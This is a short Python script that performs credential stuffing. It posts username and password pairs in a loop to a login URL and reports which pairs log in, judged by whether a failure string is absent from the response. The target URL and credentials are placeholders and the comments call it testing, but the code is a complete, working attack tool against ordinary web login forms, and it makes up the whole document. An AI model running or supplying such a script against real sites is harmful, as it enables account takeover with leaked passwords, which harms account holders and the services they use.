import requests

def credential_stuffing(target_url, credential_pairs):
    for username, password in credential_pairs:
        # Prepare the login data payload (adjust the field names according to the form)
        login_data = {
            'username': username,
            'password': password
        }

        # Send POST request to the login URL
        response = requests.post(target_url, data=login_data)

        # Check for a successful login by examining the response
        # (This needs to be adjusted based on the actual response from your test target)
        if "Login failed" not in response.text:  # Replace with the correct failure text or status code
            print(f"[+] Success: Username: {username}, Password: {password}")
        else:
            print(f"[-] Failed: Username: {username}, Password: {password}")

# Define the target URL and credentials to test
target_url = 'http://your-test-site.com/login'  # Replace with your test login URL
credential_pairs = [
    ('user1', 'password1'),
    ('user2', 'password2'),
    # Add more pairs for testing
]

credential_stuffing(target_url, credential_pairs)
